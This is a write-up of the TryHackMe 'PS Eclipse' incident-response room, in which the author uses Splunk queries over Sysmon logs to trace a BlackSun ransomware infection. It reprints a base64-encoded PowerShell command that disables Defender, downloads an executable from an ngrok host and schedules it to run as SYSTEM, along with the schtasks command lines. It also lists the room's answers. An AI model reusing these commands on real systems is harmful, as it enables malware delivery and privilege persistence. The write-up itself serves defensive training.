---
title: 'THM - PS Eclipse'
layout: single
author_profile: true
permalink: /writeups/thmPSEclipse
excerpt: 'Writeup for TryHackMe PS Eclipse Room'
toc: true
toc_sticky: true
toc_label: Questions
---
## About
A writeup for a TryHackMe room **PS Eclipse** completed on 22 July 2023.

## Scenario

You are a SOC Analyst for an MSSP (Managed Security Service Provider) company called **TryNotHackMe**.

A customer sent an email asking for an analyst to investigate the events that occurred on Keegan's machine on **Monday, May 16th, 2022**. The client noted that **the machine** is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan's device.

Your manager has tasked you to check the events in Splunk to determine what occurred in Keegan's device.

Happy Hunting!

### Gathering log information

From the scenario, I can gather two things, the incident happened on **May 16th, 2022** and **Keegan’s** machine may be infected. 

I first set the date range to query from 05/16/2022 - 05/17/2022. 

![query](/assets/images/thmpseclipse/pseclipse_1.png)

Looking at the User category, I see `DESKTOP-TBV8NEF\keegan`.

![users](/assets/images/thmpseclipse/pseclipse_2.png)

From the sourcetype, I also know that the logs are from Sysmon.

![sysmon](/assets/images/thmpseclipse/pseclipse_3.png)

### A suspicious binary was downloaded to the endpoint. What was the name of the binary?

Now I can start filtering for Keegan machine. I know Keegan has downloaded a suspicious binary, which can be determined by filtering for new file creation using **EventCode=11**. Additionally, I created a table to see what files have been created on Keegan’s machine. 

```
index="main" User="DESKTOP-TBV8NEF\\keegan" EventCode=11 
| table TargetFilename
```

From the table, I see that there are many files from OneDrive created. 

![onedrive](/assets/images/thmpseclipse/pseclipse_4.png)

In particular, this file in `C:\Windows\Temp\OUTSTANDING_GUTTER.exe` caught my eye. This is a uncommon file in the `%TEMP%` folder.

![temp](/assets/images/thmpseclipse/pseclipse_5.png)

This exe file might be the suspicious binary, but I can do more checks to confirm it. 

```
index="main" User="DESKTOP-TBV8NEF\\keegan" "OUTSTANDING_GUTTER.exe"
```

I can see `OUTSTANDING_GUTTER.exe` is being scheduled to run with `schtasks.exe`. `OUTSTANDING_GUTTER.exe` was scheduled to run with the permissions of `NT AUTHORITY\SYSTEM` as seen in the flag `/RU SYSTEM`. Setting up a scheduled task and running it with `NT AUTHORITY\SYSTEM` permissions points to the file being suspicious and possibly malicious.

![schtasks](/assets/images/thmpseclipse/pseclipse_6.png)

**Answer:** `OUTSTANDING_GUTTER.exe`

### What is the address the binary was downloaded from? Add **http://** to your answer & defang the URL.

In the second log of the image below, there is a field ParentCommandLine. 

![parentcommandline](/assets/images/thmpseclipse/pseclipse_7.png)

I decoded this command using cyberchef, which shows the URL the binary was downloaded from. 

![powershell](/assets/images/thmpseclipse/pseclipse_8.png)

```
# plain text of the encoded command
UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA

```

![cyberchef](/assets/images/thmpseclipse/pseclipse_9.png)

**Answer:** hxxp[://]886e-181-215-214-32[.]ngrok[.]io

### What Windows executable was used to download the suspicious binary? Enter full path.

From the same log entry above, it shows the ParentImage that was used to download the binary, which is powershell.

![parentimage](/assets/images/thmpseclipse/pseclipse_10.png)

**Answer:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

### What command was executed to configure the suspicious binary to run with elevated privileges?

As shown in an earlier screenshot in question 1, I saw the exe being run with `schtasks.exe`. Using the same filter, we can determine the the command used to execute the binary in the CommandLine field. 

```bash
index="main" User="DESKTOP-TBV8NEF\\keegan" "OUTSTANDING_GUTTER.exe"
```

![commandline](/assets/images/thmpseclipse/pseclipse_11.png)

**Answer:** `"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f`

### What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? **(Format: User + ; + CommandLine)**

From the cyberchef output shown below, I can see the entire command executed in powershell. Here we can see `schtasks.exe` being executed with `/RU “SYSTEM”` flag which denotes that is will be run as `NT AUTHORITY\SYSTEM`. Also, the final command is what was used to run the binary. 

![cyberchef](/assets/images/thmpseclipse/pseclipse_12.png)

Using the below filter, I also managed to find the log entry. 

```bash
index="main" User="DESKTOP-TBV8NEF\\keegan" "OUTSTANDING_GUTTER.exe"
```

As seen in this log entry, I see the CommandLine field with `"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe.`

![log](/assets/images/thmpseclipse/pseclipse_13.png)

**Answer:** `NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe`

### The suspicious binary connected to a remote server. What address did it connect to? Add **http://** to your answer & defang the URL.

I know that the binary is running with `NT AUTHORITY\SYSTEM` privilege and this binary is running to communicate with a remote server. Thus, using this filter below allows me to see all DNS queries, and helps me find the URL the binary has connected to.

```bash
index="main" User="NT AUTHORITY\\SYSTEM" TaskCategory="Dns query (rule: DnsQuery)"
```

Under the field “QueryName”, I managed to find the URL.

![queries](/assets/images/thmpseclipse/pseclipse_14.png)

**Answer:** hxxp[://]9030-181-215-214-32[.]ngrok[.]io

### A PowerShell script was downloaded to the same location as the suspicious binary. What was the name of the file?

We know that the binary was downloaded into Keegan machine in the `C:\Windows\Temp` folder. We can filter for this folder and for **EventCode=11**.

```bash
index="main" EventCode=11 "C:\\Windows\\Temp" "*.ps1"
```

Looking at the TargetFilename I see five different *.ps1 files. A quick Google search shows that the first four *.ps1 files are not malicious and are normal files generated by powershell for testing against Applocker.

![targetfilename](/assets/images/thmpseclipse/pseclipse_15.png)

**Answer:** script.ps1

### The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?

I know the name of the script, and thus used the filter below to further reduce the number of events.

```bash
index="main" "C:\\Windows\\Temp" "script.ps1"
```

In this log entry, the MD5 of the file (**3EBAB71CB71CA5C475202F401DE008C8**) is shown.

![hashes](/assets/images/thmpseclipse/pseclipse_16.png)

Going to VirusTotal, I looked up the MD5 which gives the actual name of the malicious script.

![virustotal](/assets/images/thmpseclipse/pseclipse_17.png)

**Answer:** BlackSun.ps1

### A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?

Googling about BlackSun ransomware led me to this [blog](https://blogs.vmware.com/security/2022/01/blacksun-ransomware-the-dark-side-of-powershell.html) by VMware Threat Analysis Unit.

The author mentioned in the blog that the ransom note will be saved as `BlackSun_README.txt`. Thus, a quick search using the following filter will show where the ransom note is saved.

```bash
index="main" "BlackSun_README"
```

![log](/assets/images/thmpseclipse/pseclipse_18.png)

**Answer:** `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt`

### The script saved an image file to disk to replace the user's desktop wallpaper, which can also serve as an IOC. What is the full path of the image?

Similarly, in the blog, the author mentioned that the wallpaper will be created as `blacksun.jpg`. Filtering for `BlackSun` alone will show the image file.

```bash
index="main" "BlackSun"
```

![log](/assets/images/thmpseclipse/pseclipse_19.png)

**Answer:** `C:\Users\Public\Pictures\blacksun.jpg`